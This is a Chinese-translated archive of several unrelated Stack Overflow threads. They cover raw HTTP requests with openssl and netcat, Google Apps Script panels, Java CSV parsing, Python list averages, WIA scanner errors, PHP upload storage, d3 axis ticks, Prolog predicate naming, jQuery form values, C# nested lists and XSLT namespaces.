* * *

## 回答 #3

> 赞同：46
> 
> 时间：2017-07-05T14:53:11.633

对于后代，您的问题是如何将 http 请求发送到`https://stackoverflow.com/questions`. 真正的答案是：您不能使用 telnet，因为这是一个仅 https 可访问的 url。

因此，您可能想使用`openssl`而不是`telnet`，例如这样

```
$ openssl s_client -connect stackoverflow.com:443
...
---
GET /questions HTTP/1.1
Host: stackoverflow.com 
```

这将为您提供 https 响应。

* * *

## 回答 #4

> 赞同：11
> 
> 时间：2018-11-08T10:56:49.397

为了稍微扩展早期的答案，有一些复杂性。

`telnet`不是特别可编写脚本的；您可能更喜欢使用`nc`(aka `netcat`)，它可以更好地处理非终端输入和信号。

此外，与 不同的是`telnet`，`nc`实际上允许 SSL（因此`https`而不是`http`流量——那么您需要端口 443 而不是端口 80）。

HTTP 1.0 和 1.1 之间存在差异。最新版本的协议要求`Host:`标头包含在请求中的`POST`or`GET`行之后的单独行中，并且后跟一个空行以标记请求标头的结束。

HTTP 协议需要回车/换行换行。许多服务器对此很宽容，但有些则不然。您可能想使用

```
printf "%\r\n" \
    "GET /questions HTTP/1.1" \
    "Host: stackoverflow.com" \
    "" |
nc --ssl stackoverflow.com 443 
```

如果您回退到 HTTP/1.0，您并不总是需要`Host:`标头，但许多现代服务器无论如何都需要标头；如果多个站点托管在同一个 IP 地址上，则服务器不知道`GET /foo HTTP/1.0`您的意思是这两个站点`http://site1.example.com/foo`是否`http://site2.example.net/foo`都托管在同一服务器上（在没有`Host:`标头的情况下，HTTP 1.0 服务器可能只是默认为与您想要的站点不同的站点，因此您不会获得想要的内容）。

HTTPS 协议在这些细节上与 HTTP 相同；唯一真正的区别在于最初如何设置会话。

# google-apps-script - 如何使用 UI 服务的 Deck Panel

> ID：15772357
> 
> 赞同：1
> 
> 时间：2013-04-02T19:10:50.237
> 
> 标签：google-apps-script

在阅读了与 UI 服务的甲板面板相关的 GAS 文档后，我了解到一旦将元素添加到甲板面板，它就会变得不可见，如果从中删除元素，它将再次可见。我写了一些测试代码，但是当我从甲板面板中删除它时，我无法使面板可见。有什么见解吗？

这是代码：

```
function doGet() {
    var app = UiApp.createApplication();
    var globalPan = app.createAbsolutePanel();
    app.add(globalPan);   
    var deckPanel = app.createDeckPanel().setId('deck').setSize(300, 300).setTitle('DeckPanel').setAnimationEnabled(true);
    globalPan.add(deckPanel);
    globalPan.add(app.createHorizontalPanel().add(app.createLabel('Element to add to DeckPanel')).setId('visiblePan'));
    var hidden = app.createHidden('hEl', 'visible').setId('hEl').setName('hEl');
    app.add(hidden);
    app.add(app.createButton('Add to DeckPanel').setId('button').addClickHandler(app.createServerHandler('handlerFunction').addCallbackElement(hidden)));
   return app;
}

function handlerFunction(eventInfo) {
    var app = UiApp.getActiveApplication();
    var parameter = eventInfo.parameter;
    var state = parameter.hEl;
    if (state == 'visible'){
        app.getElementById('deck').add(app.getElementById('visiblePan')); 
        app.getElementById("button").setText("Remove from DeckPanel");
        app.getElementById('hEl').setValue('hidden');
    };
    else{
        app.getElementById('deck').remove(0);
        app.getElementById("button").setText("Add to DeckPanel");
        app.getElementById('hEl').setValue('visible'); 
    };
    return app;
} 
```

# multidimensional-array - 导入 .txt 或 .csv 文件并存储在多维数组中的最佳方式

> ID：15772363
> 
> 赞同：0
> 
> 时间：2013-04-02T19:11:07.540
> 
> 标签：multidimensional-array, text-files, import-from-csv

我整个早上都在该网站上搜索，但没有找到适合我的答案。如果还有其他答案，请见谅。这可能是一个简单的问题，但由于某种原因，它在工作中难住了我。我有一个 .csv 文件（虽然没有限制，它可以是 .txt 文件或任何我想要的文件）现在只有两个值，幅度和频率（以后会有更多）。我编写了一个类来将一列导入到数组中，我认为我可以轻松地完成第二列。没那么容易。这是单个数组的代码。任何有关如何将其转换为多维数组的帮助将不胜感激。

```
public static ArrayList<Integer> readData(String filename) throws FileNotFoundException {
    Scanner scanner = new Scanner(new File(filename));
    ArrayList<Integer> aList = new ArrayList<>();
    while(scanner.hasNextInt()) {
        aList.add(scanner.nextInt());         
        }
    return aList;
} 
```

这是我的主要课程。基本上我需要获取任何值并将它们暂时存储在多维数组中。然后它们将通过 MODBUS 和一个保持寄存器传递给控制器​​。

```
public static void main(String[] args) throws FileNotFoundException, Exception {

    ArrayList<Integer> aList = BrushSealDataFactory.readData("AmplitudeFrequency.csv");
    for (int i = 0; i < aList.size(); i++) {
        System.out.println(aList.get(i));
    }

    int[] aArray = new int[aList.size()];
    for (int i = 0; i < aList.size(); i++) {
        aArray[i] = aList.get(i);
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T19:33:42.833

这是使用 java 将文件拆分为二维数组的一个很好的示例：

[CSV数据到二维数组java](https://stackoverflow.com/questions/12967756/csv-data-to-2d-array-java)

请注意将值正确转换为您需要的任何格式。

# javascript - 带有 Javascript 的旋转光标 (Thobber)

> ID：15772366
> 
> 赞同：1
> 
> 时间：2013-04-02T19:11:10.667
> 
> 标签：javascript, jquery, cursor

**你好，** 我喜欢在服务器端验证表单时显示一个旋转的类似 thobber 的光标。

您还有其他（更好的）建议吗？

我找到了这个，但是如何将它添加到光标？ [http://aino.github.com/throbber.js/](http://aino.github.com/throbber.js/)

最好的问候马克

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T20:10:54.307

这可能是另一个选项，它将显示在您设置的表单或元素的中心。 [http://fgnass.github.com/spin.js/](http://fgnass.github.com/spin.js/)

您可以在 spin.js 中配置微调器的外观，并且非常易于使用。

如果您需要更改光标，我认为这可能有助于 [根据事件更改鼠标光标](https://stackoverflow.com/questions/4988016/mouse-cursor-change-based-on-event#)

# python - 查找列表中项目的平均长度。Python

> ID：15772371
> 
> 赞同：3
> 
> 时间：2013-04-02T19:11:15.620
> 
> 标签：python, string, list, average

```
my_list = [['abcdefg','awdawdawd'],['awdwer'],[],'rtgerfwed','wederfrtg']] 
```

所以我有一个列表，我想找到列表中每个子列表的平均长度

我试过了，但它似乎没有用

```
lengths = []
lengths = my_list

for k in lengths:
    k = len(k)

print lengths

# i get this again -> [['abcdefg','awdawdawd'],['awdwer'],[],'rtgerfwed','wederfrtg']] 
```

我希望输出是

```
lengths = [8,6,0,9] 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-02T19:12:34.990

列表中每个元素的长度列表：

```
lengths = [len(i) for i in my_list] 
```

对于平均值：

```
def averageLen(lst):
    lengths = [len(i) for i in lst]
    return 0 if len(lengths) == 0 else (float(sum(lengths)) / len(lengths)) 
```

如果是列表列表：

```
lengths = [averageLen(i) for i in my_list] 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-02T19:26:53.940

首先，在 python 中迭代一个列表只会将每个项目的值复制到一个临时变量中。因此，实际上，在您的示例中，`k`为列表中的每个项目分配了一个值，但是更改它不会更改原始列表。其次，您似乎试图将列表中的每个项目映射到其长度，而不是映射到其项目的平均长度。使用内置函数可以轻松地将每个项目映射到其长度`map`：`map(len,lengths)`. 但是，要完成您的要求，我们需要进行一些改进。让我们定义一个函数来计算列表项的平均长度：

```
def average_len(l):
  return sum(map(len, l))/float(len(l)) 
```

现在我们可以再次使用 map 来获取每个子列表的平均值`map(average_len, lengths)`：

# c# - 尝试使用 wpf 连接到扫描仪时出现错误代码

> ID：15772373
> 
> 赞同：3
> 
> 时间：2013-04-02T19:11:16.393
> 
> 标签：c#, wia

我正在使用 WIA 连接到扫描仪。我枚举设备信息，然后尝试连接到设备。我不断收到异常。

HRESULT 异常：0x80210006

我在 WPF 窗口后面的代码中调用代码。

```
 DeviceManager manager = new DeviceManagerClass();
        DeviceInfo device = null;
        foreach (DeviceInfo deviceInfo  in manager.DeviceInfos)
        {
            var ID = deviceInfo.DeviceID;
            var props = deviceInfo.Properties ;
            foreach (Property property in props)
            {
                var name = property.Name;
                var descr = property.get_Value() as string;
            }
            var type = deviceInfo.Type;
            if (type == WiaDeviceType.ScannerDeviceType)
                device = deviceInfo;
        }
        if (device != null)
              device.Connect(); 
```

我无法弄清楚为什么会这样。任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-02T19:17:44.410

`HRESULT: 0x80210006`是`WIA_ERROR_BUSY`。

从[WIA API 错误代码页面](http://msdn.microsoft.com/en-us/library/windows/desktop/ms630183%28v=vs.85%29.aspx)：

```
WIA_ERROR_BUSY        The WIA device is busy. 
```

根据[Communicating with a WIA Device in Multiple Threads or Applications](http://msdn.microsoft.com/en-us/library/windows/desktop/ms630350%28v=vs.85%29.aspx)，看起来其他东西可能正在访问该设备：

> If a thread currently has a device locked (it is actively communicating with that device) and another thread attempts to call a method that actively communicates with the device, the method returns a `WIA_ERROR_BUSY` error.

# php - 我应该将上传的文件存储在服务器的哪里？

> ID：15772375
> 
> 赞同：-1
> 
> 时间：2013-04-02T19:11:27.143
> 
> 标签：php

我正在学习 php 以及做一个涉及将文件上传到服务器的项目。我的目标是使其尽可能安全，因此您建议将所有上传的文件保存在哪里。要上传的文件都是pdf文件。我在某处读到最好将上传的文件保存在文档根目录之外，而在其他地方我读到从 php 访问文档根目录之外的文件并不容易，所以我很困惑。感谢您对克服这种情况的最佳实践的任何帮助！谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T19:19:16.340

我相信不在根路径中存储文件的原因是理论上有人可以猜出导演并访问文件，您可以学习权限（在服务器上）这可能会非常困难，或者您使用诸如NAS 驱动器（它看起来好像是您网络的本地驱动器，但网络外的任何人都无法看到）但是这可能很昂贵，并且是您需要学习的另一件事（配置 NAS 盒）。如果这两个都不起作用，请尝试在服务器上使用单独的驱动器或将驱动器分区为两个驱动器。并将文件存储在那里，至于代码本身，只需指定完整路径并像对待根驱动器上的任何其他文件一样对待它（我就是这样做的，但我不是 PHP 专业人士）。如果您有任何其他问题，请随时提出，我希望我为您回答了这个问题:)

以下是几种分区驱动器的方法：

Vista/Windows server 2008（或大多数其他 Windows 服务器）：http: [//blogs.technet.com/b/steve_lamb/archive/2008/07/08/how-to-re-partition-a-hard-disk-under -vista-or-server-2008-without-have-to-re-install.aspx](http://blogs.technet.com/b/steve_lamb/archive/2008/07/08/how-to-re-partition-a-hard-disk-under-vista-or-server-2008-without-having-to-re-install.aspx)

祝你好运！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-02T19:21:11.537

出于安全目的，将上传文件临时存储在文档根目录之外并不是一个坏主意，直到它们被筛选出可执行代码或确保它们符合您的期望。这样，任何获得上传机制访问权限的人都无法通过您的界面上传后门，然后通过浏览器访问它（并接管您的服务器）。他们也无法上传导致您的网站执行其他操作的恶意代码。

一旦进行了筛选，为了让某人访问文件（查看 PDF），文件最终需要存储在文档根目录之上，以获得良好的 SEO。这样一来，搜索引擎就可以链接它们并从中挖掘信息，而无需对服务器征税。

有人说您可以将它们存储在文档根目录下，然后将它们作为附件呈现给用户，然后通过 fread 流式传输给他们。问题是，如果您使用的文件很大，如果同时连接了几个人或机器人，您的特定服务器实例可能会耗尽资源。

您也可以将它们直接流式存储在数据库中，但这在初始筛选之外没有提供任何额外的安全性。此外，从数据库中实际检索它们需要内存和开销，并且如果它们都同时连接，搜索引擎可能会再次耗尽您的系统资源。

# d3.js - 在 d3 中将刻度定位到重叠轴

> ID：15772376
> 
> 赞同：1
> 
> 时间：2013-04-02T19:11:39.473
> 
> 标签：d3.js

如何在d3.js中实现轴的以下效果，其中刻度线实际上与轴相交，并且刻度线和轴是不同的颜色。

```
 |
 ---
  |
 ---     |      |      |      |      |
  |======|======|======|======|======|
         |      |      |      |      | 
```

我可以设置刻度的笔画宽度，但我不知道如何定位/偏移它。

更新：下面拉斯的回答有助于定位刻度，但它不允许我让刻度与轴重叠，因为路径元素位于刻度标记之后，因此它具有更高的“z-index”。因此，答案的第二部分将需要能够将路径元素移动到以下清单中包含 g 的开头：

```
<g class="x axis" transform="translate(0,55)">
    <g style="opacity: 1;" transform="translate(50,0)">
        <line class="tick" y2="-55" x2="0" transform="translate(0,5)"></line>
        <text y="3" x="0" dy="1.5em" text-anchor="middle" style="font-size: 10px;">1955</text>
    </g>
    <g style="opacity: 1;" transform="translate(112.5,0)">
        <line class="tick" y2="-55" x2="0" transform="translate(0,5)"></line>
        <text y="3" x="0" dy="1.5em" text-anchor="middle" style="font-size: 10px;">1960</text>
    </g>
    <g style="opacity: 1;" transform="translate(175,0)">
        <line class="tick" y2="-55" x2="0" transform="translate(0,5)"></line>
        <text y="3" x="0" dy="1.5em" text-anchor="middle" style="font-size: 10px;">1965</text>
    </g>
    <path class="domain" d="M0,-55V0H800V-55"></path>
</g> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-02T19:26:23.393

刻度线被分配给`tick`类。如果为轴本身设置类，则可以使用它来区分轴和刻度以设置颜色：

```
.axis { stroke: black; }
.tick { stroke: red; } 
```

同样，您可以使用它来翻译刻度。例如

```
xAxisElement.selectAll(".tick").attr("transform", "translate(0,-5)"); 
```

然后，您可以使用[`.sort()`](https://github.com/mbostock/d3/wiki/Selections#wiki-sort)和`.order()`选择`g`包含轴的元素，对它们进行排序以使轴线排在最后，并相应地重新排序文档中的元素。代码看起来像

```
d3.selectAll("axis *").sort(function(a,b) {
    if(a.nodeName == "path") { return -1; }
    else if(b.nodeName == "path") { return 1; }
    return 0;
}).order(); 
```

# java - 哪种机制负责Java中字段的初始初始化

> ID：15772378
> 
> 赞同：4
> 
> 时间：2013-04-02T19:11:48.637
> 
> 标签：java

据我们所知，Java 对象的字段是这样初始化的：

*   布尔变量获取`false`
*   其他原始类型（如 int、byte、long）`0`
*   对象得到`null`

我的问题是哪种机制（方法）在做这项工作，什么时候做？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-02T19:18:26.777

这些初始化是在 JVM 创建类的新实例时完成的。请参阅[创建新类实例](http://docs.oracle.com/javase/specs/jls/se7/html/jls-12.html#jls-12.5)部分。它指出：

> 每当创建一个新的类实例时，都会为其分配内存空间，并为该类类型中声明的所有实例变量和该类类型的每个超类中声明的所有实例变量（包括所有可能隐藏的实例变量）分配空间（ §8.3)。
> 
> 如果没有足够的可用空间为对象分配内存，则类实例的创建会突然完成并出现 OutOfMemoryError。否则，**新对象中的所有实例变量，包括在超类中声明的变量，都将初始化为其默认值**（第 4.12.5 节）。

每种类型的实例变量的默认值如下：

> *   对于 type `byte`，默认值为 0，即 的值`(byte)0`。
> *   对于 type `short`，默认值为 0，即 的值`(short)0`。
> *   对于 type `int`，默认值为 0，即`0`。
> *   对于 type `long`，默认值为 0，即`0L`。
> *   对于 type `float`，默认值为正零，即`0.0f`。
> *   对于 type `double`，默认值为正零，即`0.0d`。
> *   对于 type `char`，默认值为空字符，即`'\u0000'`。
> *   对于类型`boolean`，默认值为`false`。
> *   对于所有`reference types`（第 4.3 节），默认值为`null`.

# prolog - 简单的数据结构

> ID：15772380
> 
> 赞同：1
> 
> 时间：2013-04-02T19:11:48.647
> 
> 标签：prolog

下面这个简单的 Prolog 程序，通过使用数据结构，表示了一个由丈夫、妻子和孩子组成的家庭列表：

```
family(
    person(bob, smith, date(7,may,1968), 30000),
    person(ann, smith, date(18,july,1970), 32000),

    [person(dave, smith, date(1,june,1984), 0),
     person(edna, smith, date(25,may,1990), 0)]
).

family(
    person(mario, rossi, date(7,may,1968), 30000),
    person(lucia, verdi, date(18,july,1970), 32000),

    [person(luca, rossi, date(1,june,1984), 0),
     person(maria, rossi, date(25,may,1990), 0),
     person(paolo, rossi, data(16, april, 1980), 10000)]
).

family(
    person(carlo, bianchi, date(7,may,1968), 30000),
    person(flavia, blabla, date(18,july,1970), 32000),

    [person(figlio1, bianchi, date(1,june,1984), 0),
     person(figlio2, bianchi, date(25,may,2001), 0),
     person(figlio3, bianchi, data(16, april, 1980), 10000),
     person(figlio4, bianchi, data(10, april, 1978), 20000)]
).

family(
    person(no, no, date(7,may,1968), 30000),
    person(no, no, date(18,july,1970), 32000),
    []
).

/* Regola che mostra i mariti: */
husband(X) :- family(X,_,_).

/* Regola che mostra l mogli: */
wife(X) :- family(_,X,_).

/* Regola che mostra i figli:
   X è figlio se in una famiglia c'è una lista di figli e se X appartiene
   alla lista dei figli: */
child(X) :- family(_,_,Children),
        member(X,Children). 
```

这很简单。根据一些事实，我代表某个家庭，并且我有一些规则来执行一些查询（获取丈夫、妻子、如果 X 是家庭中的孩子、如果家庭中存在一个人、一个人的薪水和日期一个人的出生）

好的，直到现在我都没有问题。

然后我有以下与上一个程序相关的练习：**编写规则以获取所有没有孩子的家庭**

我的想法是，如果孩子列表是空列表，则家庭没有孩子。获得一个没有孩子的家庭意味着显示这些家庭的夫妻姓名，我在之前的程序中添加这条规则来解决它：

```
nochildren(X,Y) :- family(X,Y,[]). 
```

它可以工作，但我不知道它是否是一个干净的解决方案，因为用户（在 Prolog shell 中执行查询）必须知道 X 代表丈夫姓名，而 Y 代表妻子姓名。

有更好的解决方案吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-02T19:28:44.070

您对 Prolog 谓词的命名约定提出了一个很好的一般性问题。一个好的经验法则是使用一个能够清楚*说明*参数是什么的名称。例如，如果第一个参数是丈夫，第二个参数是他的妻子，谓词名称的起点可以是：

`husband_wife(X, Y) :- ...`

但是，在您的情况下，该名称还应明确说明还拥有特定财产，即这对夫妇没有孩子。关于什么：

`childless_husband_wife(X, Y) :- ...`

对我来说似乎很清楚。

你可以对`family/3`. 在我看来，一个更好的名字应该是`husband_wife_children/3`，因为它清楚地表明了它的论点是什么。我们最终得到：

`childless_husband_wife(H, W) :- husband_wife_children(H, W, []).`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-02T20:11:05.577

您必须在自我记录和`very_long_predicate_names`. 恕我直言

```
childless(Husb,Wife):-    % a childless family
  family(Husb,Wife,[]). 
```

差不多吧。即，我们可以为谓词及其参数使用暗示性名称*，*作为自记录功能。评论也不错。

# jquery - 不一致的行为或输入字段值

> ID：15772382
> 
> 赞同：1
> 
> 时间：2013-04-02T19:11:55.900
> 
> 标签：jquery, html, forms, input, bpopup

我在带有一些自定义验证的模态窗口中有一个表单，我在按钮 .click 上序列化表单数据，表单操作是 javascript:void() ，现在我有一个可选的输入字段

```
<input type="text" name="property_id" id="pid" value='' class="optional"/> 
```

我有选择地序列化它

```
var values = $(form).find('input[value!=""]').serialize(); 
```

现在，当我输入表单并且没有提交时，pid 字段的值属性没有得到更新。所以在我尝试运行的 chrome js 控制台中

```
$("#pid").val() 
```

它给了我我输入的任何东西，但是

```
$("#pid").attr('value') 
```

给我 ””

这种行为的原因是什么？我正在 ajax 加载此表单。编辑：我正在使用 bpopup jquery 插件在文档加载后在模式窗口上加载表单。这是它在不同的 html 文件中的形式，该文件是使用 bpopup 将 ajax 作为弹出窗口加载的，脚本链接在此文件中。

```
<form class="form-horizontal" id="vmuform" action="javascript:void(0);"> 
```

整个代码太长，无法在此处发布

```
$(function(){
$("#vmusubmit").click(function(){
var uname=
var pass= 
var base = 
var form = $(this).parents('form:first');
console.log(form.attr('id'))
if(form.attr('id') === 
var path=
if(form.attr('id') === 
var path="
if(form.attr('id') === 
var path="

var values = $(form).find('input[value!=""]').serialize();
console.log(values);
$.ajax( {crossDomain: true,
       username:uname,
       password: pass,
       type: "POST",
       url: base+path,
       data: values,
       dataType:"xml",
       success: function( response ) {
           console.log( response );
           var stat=$(response).find('rsp').attr('stat');
           if(stat ==='ok'){
               $('#mod-alert').html("Data successfully added.").addClass("alert-success").removeClass("alert-error").show();
           }
           else
               {
                   $('#mod-alert').html($(response).find('message')).addClass("alert-error").removeClass("alert-success").show();
               }
       }
} );
});

}) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T19:27:24.467

那是由于`.val() and .attr('value')`不完全相同。

仅在`.attr(..)`创建 html 时返回对象值（即原始值）。

`.val()`正在获取可以多次更改的对象的属性值。

至于为什么即使你输入了一些东西也没有提交值的原因，只有我们看到更多的代码才能解释。但是，序列化表单并消除所有空值的最佳方法是克隆它。

```
$(form).clone().find('input:text[value=""]').remove().end().serialize(); 
```

# python - TypeError：“str”对象不可调用（Python 2.4.3）

> ID：15772385
> 
> 赞同：0
> 
> 时间：2013-04-02T19:12:06.723
> 
> 标签：python

当我尝试在 Python 2.4.3 中运行以下脚本时，出现错误：

```
[root@localhost bin]# ./clokins.py 
Traceback (most recent call last):
  File "./clokins.py", line 162, in ?
    print main(argv)
  File "./clokins.py", line 156, in main
    cloc = cloc_cmdline(fpath, arguments[1:])
  File "./clokins.py", line 118, in cloc_cmdline
    (binary, cloc_opts) = readopts(cmdarg)
  File "./clokins.py", line 108, in readopts
    exit('File does not exists : %s'%(options.clocpath))
TypeError: 'str' object is not callable 
```

来源 ：

clokins.py

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
 Copyright (C) 2012 Rodolphe Quiedeville <rodolphe@quiedeville.org>

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.

 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.

 You should have received a copy of the GNU General Public License
 along with this program.  If not, see <http://www.gnu.org/licenses/>.
"""
from os import path, access, X_OK
from os import chdir
from sys import argv
from commands import getoutput
from optparse import OptionParser

VERSION = "1.2.0"

def trigger_start(string):
    """
    Return true if we can begin to count
    """
    if string.startswith('language,filename,blank,comment,code'):
        return True
    else:
        return False

def trigger_stop(string):
    """
    Return true if we have to stop counting
    """
    if string.startswith('files,language,blank,comment,code'):
        return True
    else:
        return False

def lang(string):
    """
    Return then language name formatted
    """
    langname = string.lower()
    if langname == 'bourne shell':
        langname = 'shell'
    return langname

def namedir(string):
    """
    Return the name dir "a la sloccount"
    """
    if string.startswith('/'):
        nmd = path.dirname(string).split('/')[1]
    else:
        nmd = path.dirname(string).split('/')[0]

    if nmd == '.':
        nmd = 'top_dir'
    return nmd

def load_exclude(filename):
    """
    Look if an exlude file is present
    """
    optname = '--exclude-list-file'
    if path.isfile(filename):
        return '%s=%s' % (optname, path.abspath(filename))
    else:
        return ""

def readopts(cmdargs):
    """
    Read options passed on command line
    """
    opts = ""
    parser = OptionParser()
    parser.add_option("--exclude-list-file",
                      action="store",
                      type="string",
                      dest="exclude_filelist",
                      default=None)

    parser.add_option("--binary",
                      action="store",
                      type="string",
                      dest="clocpath",
                      default="/usr/bin/cloc")

    options = parser.parse_args(args=cmdargs)[0]

    if options.exclude_filelist is not None:
        opts = load_exclude(options.exclude_filelist)

    if options.clocpath is not None:
        if not path.isfile(options.clocpath):
            exit('File does not exists : %s'%(options.clocpath))
        if not access(options.clocpath, X_OK):
            exit('File does not exists : %s'%(options.clocpath))
    return options.clocpath, opts

def cloc_cmdline(fpath, cmdarg):
    """
    Build the cloc command line
    """
    (binary, cloc_opts) = readopts(cmdarg)
    cmdline = "%s --csv %s --by-file-by-lang %s %s""" % (binary,
                                                         '--exclude-dir=.git',
                                                         cloc_opts,
                                                         fpath)
    return cmdline

def parse_cloc(text):
    """
    Parse the cloc output
    """
    flag = False
    output = ""
    for line in text.split('\n'):
        if trigger_stop(line):
            flag = False

        if flag:
            datas = line.split(',')
            output += '%s\t%s\t%s\t%s\n' % (datas[4],
                                            lang(datas[0]),
                                            namedir(datas[1]),
                                            datas[1])

        if trigger_start(line):
            flag = True
    return output

def main(arguments):
    """
    Main function
    """
    fpath = arguments[len(arguments) - 1]
    if path.isdir(fpath):
        chdir(fpath)
        fpath = '.'
    cloc = cloc_cmdline(fpath, arguments[1:])
    text = getoutput(cloc)
    return parse_cloc(text)

if __name__ == '__main__':
    print main(argv) 
```

但同样的脚本，在 Python 2.7.3 上运行时不会出错。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-02T19:17:53.457

您使用了`exit`未记录的内置函数，不应该使用，并且在不同的 Python 版本上显然表现不同。您应该使用适当的`print`语句`sys.exit`来代替。

# c# - 动态列表数

> ID：15772388
> 
> 赞同：1
> 
> 时间：2013-04-02T19:12:16.460
> 
> 标签：c#, list

我正在尝试在 C# 中创建动态数量的列表，但我不确定要写什么。这是我所拥有的：

```
List<List<ISpoolerObject>> writer = new List<List<ISpoolerObject>>();

for(int z=0; z < numPartitions; z++)
    writer[z] = new; 
```

我知道顶部是正确的，但我只是不确定在循环内新的右侧放置什么。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-02T19:14:22.080

您必须使用`Add`方法将新项目添加到`List`实例中：

```
List<List<ISpoolerObject>> writer = new List<List<ISpoolerObject>>(numPartitions);

for(int z = 0; z < numPartitions; z++)
{
    writer.Add(new List<ISpoolerObject>());
} 
```

只是为了好玩 - 它也可以以不同的方式完成：

```
List<List<ISpoolerObject>> writer = Enumerable.Range(0, numPartitions).Select(x => new List<ISpoolerObject>()).ToList(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-02T19:14:23.820

您应该使用`Add`方法将列表添加到`writer`.

```
for(int z=0; z < numPartitions; z++)
{
    writer.Add(new List<ISpoolerObject>());
} 
```

或者你可以使用`Range`方法

```
List<List<ISpoolerObject>> writer = Enumerable.Range(0, numPartitions)
                                              .Select(i => new List<ISpoolerObject>())
                                              .ToList(); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-02T19:16:28.627

如果您提前知道要放入`List<T>`类型中的项目数，那么您应该使用接受容量的构造函数

```
List<List<ISpoolerObject>> writer = new List<List<ISpoolerObject>>(numPartitions); 
```

这使得`List<T>`以后添加元素时效率更高。至于实际循环添加新元素使用`Add`方法

```
for(int z = 0; z < numPartitions; z++) {
  writer.Add(new List<ISpoolerObject>());
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-02T19:14:43.277

您所拥有的将不起作用，因为您没有使用任何元素初始化列表列表。您必须`Add()`为`new List<ISpoolerObject>()`每个分区提供所需的内容。

```
List<List<ISpoolerObject>> writer = new List<List<ISpoolerObject>>();

for(int z = 0; z < numPartitions; z++)
{
    writer.Add(new List<ISpoolerObject>());
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-04-02T19:15:05.740

尝试将其分解为多个步骤

```
for (int z = 0; z < numPartitions; z++)
{
    // what do we want to add here?
    // a list of IspoolerObject.
    // so let's create that first.
    List<ISpoolerObject> aSingleList = new List<ISpoolerObject>();

    // now we add it to the list of lists
    writer.Add(aSingleList);
} 
```

请注意，您将不得不处理在某个地方填充单个列表。

# xslt - 如何避免 XSLT 中所有子节点的命名空间声明

> ID：15772391
> 
> 赞同：1
> 
> 时间：2013-04-02T19:12:22.977
> 
> 标签：xslt, namespaces

我正在使用这个 XSL 文件：

主要的：

```
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
      xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">

    <xsl:import href="HubGenerico.xsl" />
    <xsl:variable name="myns" select="'http://tempuri.org/'" />

    <xsl:template match="/RCECSTD2">
        <soap:Envelope>
            <soap:Header />
            <soap:Body />
            <xsl:variable name="codOperacion" select="STDR2_DATOS_CONTROL/STDR2_CODOPE" />
            <xsl:choose>
                <xsl:when test="$codOperacion = 1010">
                    <wsb:ConsultarSC xmlns:wsb="'http://tempuri.org/'">
                        <xsl:call-template name="STDR2_DATOS_CONTROL">
                            <xsl:with-param name="ns" select="$myns" />
                        </xsl:call-template>
                        <xsl:call-template name="STDR2_DATOS_EMPRESA">
                            <xsl:with-param name="ns" select="$myns" />
                        </xsl:call-template>
                        <wsb:numeroReferenciaDeuda>
                            <xsl:value-of
                                select="normalize-space(STDR2_DATOS_TRANSACCION/STDR2_NUMREF_DEUDA)" />
                        </wsb:numeroReferenciaDeuda>
                        <xsl:call-template name="STDR2_DATOS_OPERACION">
                            <xsl:with-param name="ns" select="$myns" />
                        </xsl:call-template>
                        <wsb:datosEmpresa />
                    </wsb:ConsultarSC>
                </xsl:when>

                <xsl:when test="$codOperacion = 2010">
                    <wsb:NotificarPago xmlns:wsb="$ns">
                        <xsl:call-template name="STDR2_DATOS_CONTROL">
                            <xsl:with-param name="ns" select="$myns" />
                        </xsl:call-template>
                        <xsl:call-template name="STDR2_DATOS_EMPRESA">
                            <xsl:with-param name="ns" select="$myns" />
                        </xsl:call-template>
                        <wsb:otrosDatosEmpresa />
                        <wsb:numeroReferenciaDeuda>
                            <xsl:value-of
                                select="normalize-space(STDR2_DATOS_TRANSACCION/STDR2_NUMREF_DEUDA)" />
                        </wsb:numeroReferenciaDeuda>
                        <wsb:NumDocDeuda>
                            <xsl:text>1</xsl:text>
                        </wsb:NumDocDeuda>
                        <wsb:formaPago>
                            <xsl:value-of select="STDR2_DATOS_TRANSACCION/STDR2_FORPAG" />
                        </wsb:formaPago>
                        <wsb:codigoMoneda>
                            <xsl:value-of select="STDR2_DATOS_TRANSACCION/STDR2_CODMON" />
                        </wsb:codigoMoneda>
                        <wsb:importeTotalPagado>
                            <xsl:variable name="importeTotalPagado">
                                <xsl:call-template name="string-replace">
                                    <xsl:with-param name="text"
                                        select="string(STDR2_DATOS_TRANSACCION/STDR2_IMPTOT_PAG)" />
                                    <xsl:with-param name="pattern" select="'.'" />
                                    <xsl:with-param name="replace-with" select="''" />
                                </xsl:call-template>
                            </xsl:variable>
                            <xsl:value-of select="$importeTotalPagado" />
                        </wsb:importeTotalPagado>
                        <wsb:detallePagoBBVA />
                        <xsl:call-template name="STDR2_DATOS_OPERACION">
                            <xsl:with-param name="ns" select="$myns" />
                        </xsl:call-template>
                        <wsb:datosEmpresa />
                    </wsb:NotificarPago>
